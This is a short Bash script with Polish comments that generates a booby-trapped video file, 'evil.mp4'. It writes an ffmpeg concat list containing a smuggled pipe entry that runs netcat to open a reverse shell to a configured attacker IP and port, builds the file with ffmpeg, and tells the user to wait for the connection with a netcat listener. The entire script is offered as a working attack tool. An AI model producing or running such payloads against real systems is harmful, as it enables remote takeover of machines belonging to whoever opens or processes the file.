#!/bin/bash

# === KONFIGURACJA ===
ATTACKER_IP="192.168.1.100"     # ← Twój IP
ATTACKER_PORT="4444"            # ← Port do nasłuchu

# === SPRAWDZENIE PLIKU BAZOWEGO ===
if [ ! -f "legit.mp4" ]; then
  echo "[!] Brakuje pliku 'legit.mp4'. Dodaj krótki plik wideo jako bazę!"
  exit 1
fi

# === PLIK LISTY ===
echo "[*] Tworzenie list.txt..."
echo "file 'legit.mp4'" > list.txt
echo "file '|/bin/bash -c \"nc $ATTACKER_IP $ATTACKER_PORT -e /bin/sh\"'" >> list.txt

# === GENEROWANIE MP4 ===
echo "[*] Generowanie złośliwego evil.mp4..."
ffmpeg -f concat -safe 0 -i list.txt -c copy evil.mp4

# === PODSUMOWANIE ===
if [[ -f "evil.mp4" ]]; then
    echo "[+] Gotowe! Plik 'evil.mp4' utworzony."
    echo "[!] Nasłuchuj połączenia: nc -lvnp $ATTACKER_PORT"
else
    echo "[!] Coś poszło nie tak – nie utworzono pliku evil.mp4."
fi
